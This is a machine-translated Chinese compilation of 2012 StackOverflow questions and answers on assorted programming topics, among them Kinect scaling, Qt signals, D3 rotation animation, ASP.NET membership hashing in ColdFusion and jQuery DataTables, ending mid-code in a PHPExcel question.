# StackOverflow 问答 13313000-13313999

# java - 我可以将登录凭据安全地发送到使用 SSL 和 HttpClient 的服务器吗？

> ID：13313001
> 
> 赞同：1
> 
> 时间：2012-11-09T17:30:05.520
> 
> 标签：java, security, ssl, httpclient

我的应用程序使用 HttpClient 登录到使用 SSL (https://site.com/login.php) 的网站。我最近从他们那里收到一条消息，说我的应用程序应该更安全地与他们的网站通信。

我已经读过 httpclient 支持 SSL，但我不确定我需要什么才能发布登录凭据并安全地登录到他们的网站。

我只需要向他们索要公钥还是还有更多？

# objective-c - iPhone 的 CGPointMake 问题

> ID：13313002
> 
> 赞同：0
> 
> 时间：2012-11-09T17:30:12.723
> 
> 标签：objective-c, xcode, cgpoint

我有2个按钮，我想让它们从屏幕上掉下来，当它们碰到指定的Y轴（411）时，它们会被隐藏并设置为NULL，然后HP标签被扣除-1点。但是当我使用 if 语句时，它会将另一个按钮跳到屏幕上。这是代码：

```
- (void)fall {
i += 1;
btn.center = (CGPointMake(btn.center.x, btn.center.y +5));

if (btn.center.y >= 411) {
    btn.hidden = TRUE;
    btn = NULL;
    startBtn.enabled = TRUE;
    hpLbl.text = [NSString stringWithFormat:@"%d", [hpLbl.text intValue]-1];
} 
```

}

```
- (void)fall2 {
i += 1;
btn2.center = (CGPointMake(btn2.center.x, btn2.center.y +5));

if (btn2.center.y >= 411) {
    btn2.hidden = TRUE;
    btn2 = NULL;
    startBtn.enabled = TRUE;
    hpLbl.text = [NSString stringWithFormat:@"%d", [hpLbl.text intValue]-1];
} 
```

}

就像我说的，fall = 一个按钮，而 fall2 = 另一个按钮。错误发生在：

```
hpLbl.text = [NSString stringWithFormat:@"%d", [hpLbl.text intValue]-1]; 
```

# wpf - Kinect SDK 1.6 和 Joint.ScaleTo 方法

> ID：13313005
> 
> 赞同：2
> 
> 时间：2012-11-09T17:30:33.350
> 
> 标签：wpf, kinect, kinect-sdk

我正在使用 Kinect SDK 1.6，并且我正在关注*Windows Kinect 快速入门系列的**骨架跟踪功能*教程，可[在此处](http://channel9.msdn.com/Series/KinectQuickstart/Skeletal-Tracking-Fundamentals)获得。

 *即使这些教程是针对 SDK 1.0 制作的，**在我按照说明将我的手的位置映射到自定义大小的窗口（比如 1280x720）之前，一切都很顺利**。

Dan Fernandez 正在使用以下代码行来实现这一点

```
 private void ScalePosition(FrameworkElement element, Joint joint)
    {
        // Convert the value to X/Y;
        Joint scaledJoint = joint.ScaleTo(1280, 720);

        ....
    } 
```

嗯，这个方法`ScaleTo`不是自定义函数，应该是在Kinect SDK中提供的，但是我的编辑说没有这个方法。我找不到它，我认为它可能自 SDK 1.0 以来已被移动/重命名/其他任何东西。

只是为了确保一切都井井有条，这是我的`using`清单，其他一切（骨骼跟踪等）都在工作，所以我真的想不通

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

using Microsoft.Kinect;
using Microsoft.Kinect.Toolkit;
using Microsoft.Samples.Kinect.WpfViewers; 
```

我可以根据要求提供有关我的代码的更多详细信息。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-10T09:50:24.027

如果你对 Coding4Fun 有正确的参考，你实际上只是错过了这个：

```
using Coding4Fun.Kinect.Wpf; 
```

在代码的开头。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-16T17:33:27.140

如果需要，您可以将此 SDK 与最新的 Microsoft SDK 结合使用`ScaleTo()`：

[http://c4fkinect.codeplex.com/](http://c4fkinect.codeplex.com/)

它是开源的，因此您也可以使用他们的代码并拥有自己的`ScaleTo()`.

请记住添加正确的 using 指令：

```
using Coding4Fun.Kinect.Wpf; 
```

[如何在 C# 中使用新的 Kinect SDK 缩放关节](https://stackoverflow.com/questions/13413200/how-to-scale-joints-using-the-new-kinect-sdk-in-c-sharp)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-09T17:42:37.560

缩放是 Coding4Fun 库的一部分，可在此处获得： [http ://c4fkinect.codeplex.com/](http://c4fkinect.codeplex.com/)

或者，您可以编写自己的缩放比例。

像这样的东西会创建一个跟踪右手的“命中框”，以右肩为中心，并将其缩放到主屏幕的分辨率。

```
double xScaled = (rightHand.Position.X - leftShoulder.Position.X) / ((rightShoulder.Position.X - leftShoulder.Position.X) * 2) * SystemParameters.PrimaryScreenWidth;
double yScaled = (rightHand.Position.Y - head.Position.Y) / (rightHip.Position.Y - head.Position.Y) * SystemParameters.PrimaryScreenHeight; 
```

下面是另一个将 Kinect 坐标缩放到屏幕分辨率的函数示例：

```
private static double ScaleY(Joint joint)
{
    double y = ((SystemParameters.PrimaryScreenHeight / 0.4) * -joint.Position.Y) + (SystemParameters.PrimaryScreenHeight / 2);
    return y;
}

private static void ScaleXY(Joint shoulderCenter, bool rightHand, Joint joint, out int scaledX, out int scaledY)
{
    double screenWidth = SystemParameters.PrimaryScreenWidth;

    double x = 0;
    double y = ScaleY(joint);

    // if rightHand then place shouldCenter on left of screen
    // else place shouldCenter on right of screen
    if (rightHand)
    {
        x = (joint.Position.X - shoulderCenter.Position.X) * screenWidth * 2;
    }
    else
    {
        x = screenWidth - ((shoulderCenter.Position.X - joint.Position.X) * (screenWidth * 2));
    }

    if (x < 0)
    {
        x = 0;
    }
    else if (x > screenWidth - 5)
    {
        x = screenWidth - 5;
    }

    if (y < 0)
    {
        y = 0;
    }

    scaledX = (int)x;
    scaledY = (int)y;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-06-30T15:39:17.773

```
you can fix the error using this dll file

http://c4fkinect.codeplex.com/releases/view/76271 
```*

# qt - 与不同级别的 Qt 小部件交互

> ID：13313011
> 
> 赞同：0
> 
> 时间：2012-11-09T17:30:43.740
> 
> 标签：qt

我正在使用 Qt 创建一个 GUI，并尝试与不同级别的元素进行交互。

```
#include <QtGui>
#include "mywindow.h"
#include "component.h"
#include "przystanki.h"
MyWindow::MyWindow(QWidget *parent) :
QMainWindow(parent)
{
    webView = new MyWebView(this);
    mainlayout = new QGridLayout();
    mainlayout->addWidget(webView, 0,0);
    Przystanki *stop = new Przystanki(this);
    mainlayout->addWidget(stop, 0, 1);
    QHBoxLayout* bottom = new QHBoxLayout();
    bottom->addWidget(new Component("Linie"));
    bottom->addWidget(new Component("Autobusy"));
    QHBoxLayout* hrightCorner = new QHBoxLayout();
    QVBoxLayout* rightCorner = new QVBoxLayout();
    rightCorner->addStretch(1);
    rightCorner->addWidget(new QPushButton("Start", this));
    rightCorner->addStretch(1);
    hrightCorner->addLayout(rightCorner);
    mainlayout->addLayout(bottom, 1, 0);
    mainlayout->addLayout(hrightCorner, 1, 1);
    hrightCorner->setAlignment(Qt::AlignCenter);
    this->setCentralWidget(new QWidget);
    this->centralWidget()->setLayout(mainlayout);

} 
```

在 webView 中，我有一个方法，我想在其中添加一个元素到 Przystanki 类中的列表中。

我该怎么做？是否有可能以一种简单的方式访问它，还是我必须以某种方式重构我的代码？（如果是这样，请给我一些建议，我应该怎么做）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T20:10:48.853

你可以：

*   在`MyWebView`类中添加一个带有您希望添加为参数的数据的信号，
*   `Przystanki`在类中添加一个与信号具有相同参数类型的槽，
*   将信号连接到`QMainWindow`构造函数中的插槽。

这样，`MyWebView`类不需要知道任何关于`Przystanki`类的信息，它只需要发出一个信号。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:29:47.010

您可以实现[setter/getter](http://en.wikipedia.org/wiki/Mutator_method)系统。

我要做的是，在您的班级中`Webview`，私下创建一个对象`Przystanki * przystanik`。Webview.h：

```
#include "przystanki.h"

class Webview{
    Webview(Przstanki *);
    Przstanki * przystanik;
} 
```

在你的类中`Przystanki`创建一个函数 getter: `type_of_list Przystanki::get_list()`。Przstanki.cpp：

```
list_type Przstanki::get_list(){
    return list;
} 
```

所以现在，在里面`Wedview`，你的对象 przystanik 可以调用 get_list: `przystanik->get_list()`。

webview.cpp：

```
Webview::Webview(Przstanki * stop){
    przystanik = stop;
}

Webview::your_method(){
    Przystanik->get_list();
} 
```

# c# - StructureMap - 注入特定实例。如何？

> ID：13313017
> 
> 赞同：0
> 
> 时间：2012-11-09T17:30:59.150
> 
> 标签：c#, .net, dependency-injection, structuremap

假设我定义了这个简单的类：

```
public class State
{
    public int Id { get; set; }
    public string Name { get; set; }
} 
```

然后我将定义、创建和注册 50 个命名实例。用户登录，我知道（比如从他的配置设置）他来自哪个州。在我的控制器中很容易说

```
var userState= ObjectFactory.GetNamedInstance<State>("Idaho"); 
```

但是我更愿意将它传递给构造函数，如下所示：

```
public class HomeController : ControllerBase
{
    private State _state;

    public HomeController(State state)
    {
        _state = state;
    }
} 
```

但是，要使其正常工作，必须传递一个特定的实例。有没有办法指定这个？

另一件事是我刚刚想到的。我可以将其定义为状态的集合，而不是定义 50 个单独的状态，如下所示：

```
public class StateCollection
{
    public List<State> States { get; set; }
} 
```

然后在构造函数中传递 StateCollection。然后客户端可以使用 LINQ 并选择适当的状态。这是一个合理的方法吗？如果集合很大怎么办？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-10T15:38:00.760

您想要做的就是所谓的基于上下文的注入。尽管有可能这样做，但基于上下文的注入通常表明应用程序设计中存在错误。在您的情况下，您似乎缺少一个简单的`ICurrentUserService`抽象，它提供有关系统中当前用户的信息：

```
public interface ICurrentUserService
{
    State State { get; }
} 
```

> 然后客户端可以使用 LINQ 并选择适当的状态。这是一个合理的方法吗？

不，可能不是，因为这让客户端负责为用户找到正确的状态，而您已经知道这一点。再次，使用正确的抽象。这使得客户端代码更容易。

> 如果集合很大怎么办？

这对我来说听起来像是过早的优化。如果它足够快，它就足够快了。但是当集合随着时间的推移而增长并且变慢时怎么办？好吧，当您在消费者中将其实现为 LINQ 语句时，这可能很难解决，因为现在您必须更改所有消费者。如果您在`ICurrentUserService`抽象的实现（或您想调用的任何名称）中编写此 LINQ 语句，则只需进行一次简单的重写即可。只需将 LINQ 查询更改为使用 a 即可`Dictionary<string, State>`。

# ios6 - iOS 模拟器黑色背景

> ID：13313020
> 
> 赞同：3
> 
> 时间：2012-11-09T17:31:05.347
> 
> 标签：ios6

**iOS 模拟器**黑色背景看起来令人沮丧，尤其是我的应用程序图标独自坐在黑色背景上。

如何插入背景图像或设置我自己选择的颜色？

您可以在具有自己背景的 Mac 或 PC 上执行此操作。**iOS模拟器**有办法吗？

[对齐顶部 http://www.kerrydeaf.com/ios6.png](http://www.kerrydeaf.com/ios6.png "工具提示")

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T17:32:35.470

进入 iOs-Simulator 包，在 contents/resources 中你会找到 frame.png，你可以更改它。

# jquery - 将复选框限制为 jQuery 中的连续集

> ID：13313023
> 
> 赞同：0
> 
> 时间：2012-11-09T17:31:10.167
> 
> 标签：jquery, checkbox, limit

我想做这样的事情：[限制复选框数量](https://stackoverflow.com/questions/2966382/limit-checkbox-amount)

但是有一点变化。我希望复选框也必须是连续的。

小例子：

如果我有 10 个复选框，并且我的限制是 3，那么用户只能检查第一个、第二个和第三个；或第三、第四、第五。不是第一，第三，第四。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T17:38:52.967

**编辑：**连续复选框的修订代码。

```
$(function () {
    var mLimit = 3;
    $(':checkbox', 'div').click(function (e) {
        var c = 0;

        $(this)
            .parent()
            .find(':checkbox').each(function (i, el) {
                if (el.checked) c++;
                else c = 0;

                if (c > mLimit) e.preventDefault();
            });        
    });
}); 
```

**演示：http:** [//jsfiddle.net/sa2Lg/2/](http://jsfiddle.net/sa2Lg/2/)

* * *

对于像下面这样的 HTML，

```
<div>
  <input type="checkbox" />
  <input type="checkbox" />
  <input type="checkbox" />
  <input type="checkbox" />
  <input type="checkbox" />
  <input type="checkbox" />
  <input type="checkbox" />
  <input type="checkbox" />
  <input type="checkbox" />
</div> 
```

您可以限制使用以下脚本，

```
$(function () {
    $(':checkbox', 'div').click(function (e) {
        if ($(this).parent().find(':checked').length > 3) {
            e.preventDefault();
        }
    });
}); 
```

**演示：http:** [//jsfiddle.net/sa2Lg/](http://jsfiddle.net/sa2Lg/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:00:09.250

我懒得真正写出来给你，因为它让我很头疼，但它可以使用`nextAll()`和`prevAll()`函数来完成。

如果这样做`$('input:checked').nextAll(':lt(2)');`，您将从选中的复选框中获得接下来的两个复选框。这就是您必须检查输入的方式。我相信您可以弄清楚所需的实际逻辑。

# javascript - 绕过浏览文件/上传文件对话框

> ID：13313026
> 
> 赞同：2
> 
> 时间：2012-11-09T17:31:17.517
> 
> 标签：javascript, google-chrome, google-chrome-extension, firefox-addon

我正在构建一个供内部使用的 Chrome 扩展程序，用户可以一步上传文件。这*始终*是同一个文件，我想跳过浏览对话框并直接为输入字段分配正确的值。

该文件与插件代码分开。

这是否可以通过 Javascript 或开发 Chrome、Firefox 扩展来实现？

我努力了：

```
input.val("file://C:/random.txt") 
```

然后提交周围的表格。但这没有用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T17:56:23.740

**火狐：**

[根据这个答案](https://stackoverflow.com/questions/2316708/file-system-access-from-firefox-extension)，你想要的似乎是可能的，但我没有仔细调查过。

**铬合金：**

在[NPAPI 插件](http://developer.chrome.com/extensions/npapi.html)之外，这绝对是不可能的。您的浏览器无法访问文件系统，除非用户通过文件对话框明确要求它这样做。如果 Web 上的任何页面能够以编程方式设置文件路径，然后在用户单击表单按钮时获取文件，那将引发巨大的安全问题。

所以，很明显，一个普通的网页肯定做不到。如果 Chrome 扩展程序*可以*做到这一点（即读取文件系统中的任何文件），那么它至少需要特殊权限。[权限列表](http://developer.chrome.com/extensions/manifest.html#permissions)不包括文件系统访问，所以这是不可能的。

正如我在开头提到的，唯一的选择是开发一个 NPAPI 插件来为您读取文件，这就像建造一家医院来治疗青春痘一样。NPAPI 具有相当陡峭的开发学习曲线，并且引入了重大的安全问题（由于您的扩展现在可以充当本地用户，因此安全妥协的成本要高得多）。

如果您愿意将文件放在浏览器的[虚拟 HTML5 文件系统](http://www.html5rocks.com/en/tutorials/file/filesystem/)上，那么您可以这样做。如果没有具体了解您的需求，我不能说这是否适合您。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T17:59:29.937

如果您的目标是将文件发送到服务器，那么尝试在字段中选择它是错误的方式 - 您可以直接`<input>`创建一个[`FormData`对象并](https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest/FormData)[通过`XMLHttpRequest`](https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest/FormData/Using_FormData_Objects). `FormData`请注意，您还可以从现有表单创建对象。这适用于 Firefox 和 Chrome，甚至适用于网页（当然，通常适用同源限制）。

棘手的部分是获取一个可以添加到表单数据的[`File`对象。](https://developer.mozilla.org/en-US/docs/DOM/File)据我所知，除了使用 NPAPI 插件之外，Chrome 扩展程序没有直接的文件系统访问权限——因此它们无法从用户的磁盘驱动器中获取文件，它们只能使用一些数据创建一个 blob。然而，Firefox 扩展具有允许它们通过路径创建对象的[`File`构造函数。](https://developer.mozilla.org/en-US/docs/Extensions/Using_the_DOM_File_API_in_chrome_code#Accessing_a_file_by_hard-coded_pathname)`File`

So in Firefox you would do something like this:

```
var formdata = new FormData();
formdata.append("file", new File("file://C:/random.txt"));

var request = new XMLHttpRequest();
request.open("POST", "http://my.server/submitFile");
request.send(formdata); 
```

# ruby-on-rails - Rails 验证：创建时跳过格式

> ID：13313028
> 
> 赞同：1
> 
> 时间：2012-11-09T17:31:20.980
> 
> 标签：ruby-on-rails, validation

Rails 在创建时跳过 :format 验证。在创建时，它接受任何东西。然后更新 :presence 和 :format 都按预期工作。我该如何更改它，以便在创建时 :allow_blank 并检查格式？

```
validates :mail, :allow_blank => true, :on => :create,
                 :format => { :with => /^([^@\s]+)@((?:[-a-z0-9]+\.)*[a-z]{2,})$/i },
                 :length => { :maximum => 60 },
                 :presence => true, :on => :update 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T17:37:32.670

尝试`validates`对 :create、:update 和所有生命周期事件使用单独的语句。当您将它们放在一起时，您的`:on => :update`选择本质上是覆盖选项。`:on => :create`

```
validates :mail, :format => { :with => /^([^@\s]+)@((?:[-a-z0-9]+\.)*[a-z]{2,})$/i },
                 :length => { :maximum => 60 }

validates :mail, :allow_blank => true, :on => :create,

validates :mail, :presence => true, :on => :update 
```

# c# - 使用一列中的值对c#中的两列进行排序

> ID：13313034
> 
> 赞同：0
> 
> 时间：2012-11-09T17:31:36.043
> 
> 标签：c#, datagridview

我有两列

```
form.myDataTable.Rows[i][2 * cs] = corr;                
form.myDataTable.Rows[i][2 * cs + 1] = "p" + Convert.ToString(col1) + " p" + Convert.ToString(col2); 
```

我需要`2*cs`按值和列中的相应名称对列进行排序`2*cs+1`。

我正在尝试这样： var corrvalues = new Dictionary(); 相关值["p" + Convert.ToString(col1) + "p" + Convert.ToString(col2)] = corr; 排序值 = 相关值.Values.OrderByDescending;

我不清楚如何使用 orderbydescending，我是 C# 新手。感谢帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T17:40:59.450

如果您使用数据绑定，它会容易得多。

你可以通过填充数据网格

```
form.myDataTable.DataSource = Enumerable.Range(0, count).Select(i => new { Column1 = corr, Column2 = "p" + Convert.ToString(col1) + " p" + Convert.ToString(col2) }).ToArray(); 
```

做一个排序也更容易

```
form.myDataTable.DataSource = Enumerable.Range(0, count).Select(i => new { Column1 = corr, Column2 = "p" + Convert.ToString(col1) + " p" + Convert.ToString(col2) }).OrderBy(k => k.Column2).ToArray(); 
```

# android - 导出失败并出现可怕的“转换为 Dalvik 格式失败并出现错误 1”错误

> ID：13313039
> 
> 赞同：0
> 
> 时间：2012-11-09T17:31:47.470
> 
> 标签：android, proguard

我在这里搜索了如何解决这个问题，但我发现没有任何帮助。我怀疑解决方案会在[这里](https://stackoverflow.com/questions/2680827/conversion-to-dalvik-format-failed-with-error-1-on-external-jar)，但我错了。启用详细信息后，控制台中没有任何内容，因此很难确定。我可以很好地导出启用了 proguard 的其他项目，但不能导出这个特定的项目。最初，我认为它与我正在使用的 opencsv jar 有关，但我删除了该 jar，并在代码中删除了对它的引用，我仍然得到错误。

在没有 proguard 的情况下导出应用程序可以正常工作，并且应用程序本身运行良好。

注意：AlternateJavaBridgelib 是我在大多数项目中使用的库。我在其他应用程序中使用 proguard 导出 apk 没有问题（这就是为什么我虽然它可能是 opencsv jar，但它是我没有在其他应用程序中使用的唯一其他 jar）。

这是我的 proguard.cfg 以防我遗漏一些东西：

```
-optimizationpasses 5
-dontusemixedcaseclassnames
-dontskipnonpubliclibraryclasses
-dontpreverify
-verbose
-optimizations !code/simplification/arithmetic,!field/*,!class/merging/*
-renamesourcefileattribute SourceFile
-keepattributes SourceFile,LineNumberTable

-keep public class * extends android.app.Activity
-keep public class * extends android.app.Application
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.content.ContentProvider
-keep public class * extends android.app.backup.BackupAgentHelper
-keep public class * extends android.preference.Preference
-keep public class com.android.vending.licensing.ILicensingService
-keep public class au.com.bytecode.**
-keep public class java.beans.**

-keepclasseswithmembernames class * {
    native <methods>;
}

-keepclasseswithmembers class * {
    public <init>(android.content.Context, android.util.AttributeSet);
}

-keepclasseswithmembers class * {
    public <init>(android.content.Context, android.util.AttributeSet, int);
}

-keepclassmembers class * extends android.app.Activity {
   public void *(android.view.View);
}

-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}

-keep class * implements android.os.Parcelable {
  public static final android.os.Parcelable$Creator *;
}

-keep class * implements java.io.Serializable {
    static final long serialVersionUID;
    private void writeObject(java.io.ObjectOutputStream);
    private void readObject(java.io.ObjectInputStream);
    public boolean equals(java.lang.Object);    
}

-dontwarn java.beans.**, android.support.v4.**, com.google.ads.**, android.provider.CalendarContract*, com.dropbox.client2.**,
android.view.Display, com.xiledsystems.AlternateJavaBridgelib.components.altbridge.FormFragment, android.widget.Switch, au.com.bytecode.opencsv.** 
```

编辑：似乎 proguard 确实有效。proguard 由于某种原因运行后似乎失败了。我得到了为项目生成的转储、映射、种子和使用 txt 文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-10T09:07:34.553

这可能是 ProGuard 中的一个错误，会产生无效代码，然后 dx 会在该错误上报告晦涩难懂的错误。确保您使用的是最新版本的 ProGuard。[如果问题仍然存在，您可以在ProGuard](http://proguard.sourceforge.net/)站点上报告它，或者给我邮寄一个可以让我重现问题的项目。

（我是他 ProGuard 的开发者）

# javascript - D3.js 动画旋转

> ID：13313043
> 
> 赞同：13
> 
> 时间：2012-11-09T17:32:02.753
> 
> 标签：javascript, animation, rotation, d3.js, transform

当我尝试使用 D3.js 库正确执行旋转动画时遇到问题。问题与我要旋转元素的点有关。

这是我为表达我的意思而制作的小提琴（慢动作）：http: [//jsfiddle.net/74mCb/](http://jsfiddle.net/74mCb/)

问题的根源似乎在这里：

```
.attr("transform", "rotate(-60, 150,130)"); 
```

然后我像这样旋转它：

```
.attr("transform", "rotate(40 150,130)"); 
```

我希望针头保持在原位（成为旋转中心），有人可以解释我做错了什么吗？

谢谢！

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-11-09T18:57:47.740

这有点难以掌握（我自己并不完全理解），但 D3 需要一些帮助来了解如何在代表您的旋转的两个字符串之间进行插值。

```
function turnNeedle()
{

    needle
      .transition()
      .duration(2000)
      .attrTween("transform", tween);

    function tween(d, i, a) {
      return d3.interpolateString("rotate(-60, 150, 130)", "rotate(60, 150, 130)");
    }

} 
```

`d`是数据，`i`是索引，`a`是属性，以防您要使此数据驱动。

[http://jsfiddle.net/SHF2M/](http://jsfiddle.net/SHF2M/)

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-11-09T19:11:53.933

这就是我认为正在发生的事情：根据[SVG 规范](http://www.w3.org/TR/SVG/coords.html#TransformAttribute)，变换

```
rotate(40 150,130) 
```

相当于：

```
translate(150,130) rotate(40) translate(-150, -130) 
```

看起来 D3 正在为平移和旋转设置动画 - 的内部`d3.transform`表示`rotate(40 150,130)`是旋转组件 + 平移组件，因此两者都包含在过渡中。

这里最简单的解决方法是在原点画你的针，用外部`g`元素将它翻译到正确的位置，然后旋转它：

```
var needle = svg
  .append("g")
    .attr("class", "needle")
    .attr("transform", "translate(150 , 130)")
  .append("path")
    .attr("class", "tri")
    // your path may have been prettier
    .attr("d", "M-3 0 L0 -130 L3 0 S3 5 0 5 S-3 5 -3 0 Z")
    .attr("transform", "rotate(-60)"); 
```

然后

```
needle
    .transition()
    .duration(2000)
    .attr("transform", "rotate(40)"); 
```

见工作小提琴：http: [//jsfiddle.net/nrabinowitz/74mCb/1/](http://jsfiddle.net/nrabinowitz/74mCb/1/)

# linux - 部署守护进程的过程和位置

> ID：13313045
> 
> 赞同：3
> 
> 时间：2012-11-09T17:32:10.230
> 
> 标签：linux, windows, deployment, porting

我是 Linux 新手。我最近将我的 C++ 窗口服务移植到了 linux 守护进程。

在 Windows 中，我有以下文件夹结构。我发现这个结构很容易让其他同事跟随并升级到新版本。

```
C:\services\my_app\version_1_0\my_app.exe  
C:\services\my_app\version_1_0\my_app.config.xml  
C:\services\my_app\version_1_0\dependencies1.dll  
C:\services\my_app\version_1_0\log\my_app_20121110.log  
C:\services\my_app\version_1_0\data\my_app_data_20121110.txt  
C:\services\my_app\start_my_app.bat 
```

我研究了一些关于在 Linux 中部署的位置，发现相当混乱：

1.  有人说二进制文件应该部署在 /usr/bin/my_app
2.  日志文件夹应该是 /var/log/my_app
3.  我应该把数据文件放在哪里？
4.  启动脚本应该放在 /etc/init.d/my_app

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-09T20:20:04.923

您可能会发现这篇[Wikipedia 文章](http://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard)很有帮助，它解释了典型 linux 文件系统中各种文件夹的用途。

第 1 点、第 2 点和第 4 点是正确的：您的守护进程应该在 中`/usr/bin`，写入日志到`/var/log`并且启动脚本应该在`/etc/init.d`.

至于“数据”文件，这取决于它实际包含的内容。如果它是您的应用程序用于配置的东西，它应该转到`/etc/yourapp`. 否则它属于`/usr/share/yourapp`.

# asp.net - Coldfusion中的asp.net sql身份验证

> ID：13313046
> 
> 赞同：0
> 
> 时间：2012-11-09T17:32:18.993
> 
> 标签：asp.net, sql, coldfusion

因此，我正在构建一个需要访问最初为 asp.net 创建的数据库的站点。我想使用与已在数据库中的 asp.net 站点相同的用户名和密码。开发者提到在asp.net中使用了默认的身份验证。

来自数据库的示例密码：sYWPXNvJlVNs8EVZvIQOSaWfQ4I=

来自数据库的示例 PasswordSalt：ruNTdhelY57ghQsTFz/TIg==

这是我尝试过的：

```
<cfquery name="auth" datasource="ct">
SELECT userid, Password, PasswordSalt from dbo.aspnet_Membership
WHERE userid = '#auth1.userid#'
</cfquery>

<cfset cfHash = toBase64(hash(auth.PasswordSalt & cookie.password, "SHA1"))>

<cfif cfHash eq auth.Password> ...then authenticate etc. 
```

我已经尝试了几次迭代，但是不行，生成的 cfHash 最终会太长，如下所示：

OUJBOUJENjI0MzEzNjM3M0EwQjk3Nzc3ODIzNUVGMkJCODczOEI0Qg==

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-10T13:24:10.770

*（编辑：原始答案并非在所有情况下都有效。大幅修改......）*

[这个线程](https://stackoverflow.com/a/12539088/104223)可能是你所追求的。总而言之，两个主要区别是：

*   使用`UTF-16LE`编码而不是`UTF-8`（CF 的默认值）。
*   对盐和密码*字节*进行编码，这可能会[产生与将所有内容编码为单个字符串不同的结果](https://stackoverflow.com/questions/17111641/membership-sha1-hash-not-the-same-for-all-users)，这就是 hash() 函数的作用：

* * *

```
<cfscript>
    thePassword = "password12345";
    base64Salt = "l+g9MUcs+cLExeDTNy8M+A==";
    // extract bytes of the salt and password
    saltBytes = binaryDecode(base64Salt, "base64");
    passBytes = charsetDecode(thePassword, "UTF-16LE" );

    // next combine the bytes. note, the returned arrays are immutable, 
    // so we cannot use the standard CF tricks to merge them    
    ArrayUtils = createObject("java", "org.apache.commons.lang.ArrayUtils");
    dataBytes = ArrayUtils.addAll( saltBytes, passBytes );

    // hash binary using java
    MessageDigest = createObject("java", "java.security.MessageDigest").getInstance("SHA-1");
    MessageDigest.update(dataBytes);    
    theBase64Hash = binaryEncode(MessageDigest.digest(), "base64");

    WriteOutput("theBase64Hash= "& theBase64Hash &"<br/>");
</cfscript> 
```

# javascript - 试图只修改第一列中的元素——改变它的类

> ID：13313047
> 
> 赞同：1
> 
> 时间：2012-11-09T17:32:20.900
> 
> 标签：javascript, jquery, datatables

我有一个表格，准确地说是一个数据表。这是正在创建的，我在第一列中有计算机名称，在之后的所有列中有价格。我正在使用 jquery.dataTables.editable 和 jquery.jeditable 中的 jquery 插件。

这是一个简单的图表来证明我的观点。

```
Column 1 | Column 2
--------------------
Apples   | 44%
--------------------
Bananas  | 23%
--------------------
Oranges  | 13%
--------------------
Other    | 10%
-------------------- 
```

实际元素没有与之关联的类。我只需要获取第 1 列元素才能拥有“read_only”类

该表是动态生成的，因此需要在 javascript 中发生。这就是我正在尝试的

```
$('tr').each(function(){
       if($("tr:first-child")){
           $(this).attr("class", "read_only");
       }
    }); 
```

这是在我初始化数据表之后的 $(document).read(function(){} 中。

关于我需要做什么的任何建议？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T17:34:27.910

试试这个...

```
$(function() {
    $("tr td:eq(0)").addClass("read_only");
}); 
```

在文档准备就绪时，它将在每一行中找到第一个 td（基于 0 的索引）并添加 class `read_only`。

我建议为表提供一个 ID 或类，您也可以在调用中引用它们，以防万一您在同一页面上有任何其他表。

显然，如果您需要删除任何现有的类，然后将其更改为`.attr("class", "read_only")`而不是`addClass`，就像您之前所做的那样。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T18:24:20.063

如果您使用的是数据表，那么在初始化期间添加类很容易，如下所示：

```
$('#example').dataTable( {
"aoColumns":
 [
    { "sClass": "my_class" }, //class for the first column
    null,
    null     
 ]
 } ); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-09T18:08:32.233

既然你要添加一个 CSS 类，为什么不只针对 td 上的第一个孩子呢？

```
#tableID tr td:first-child {

} 
```

甚至不需要jquery

如果你真的想添加一个类，你可以这样做

```
$('#tableID tr td:first-child'); 
```

# php - PHPExcel - 合并单元格的动态行高

> ID：13313048
> 
> 赞同：5
> 
> 时间：2012-11-09T17:32:28.493
> 
> 标签：php, phpexcel

经过大量的反复试验，我似乎仍然无法找到一种解决方法来让合并的单元格具有 AutoFit 高度。

我尝试了一种基于我在此站点上找到的一些 VBA 代码的方法：[https ://groups.google.com/forum/?fromgroups=#!topic/microsoft.public.excel.programming/pcvg7o5sKhA](https://groups.google.com/forum/?fromgroups=#!topic/microsoft.public.excel.programming/pcvg7o5sKhA)

以下代码粘贴文本、换行并将单元格 (A1) 的宽度更改为我想要的合并单元格的总宽度。然后，它合并单元格并将 A 列设置回原始宽度。$note 是任何长字符串。$vAlignTop 是一个数组，用于设置文本与单元格顶部的对齐方式。

```
$totalWidth = 67.44; //width of columns A-H

$objPHPExcel->getActiveSheet()->setCellValue('A1', $note);
$objPHPExcel->getActiveSheet()->getColumnDimension('A')->setWidth($totalWidth);
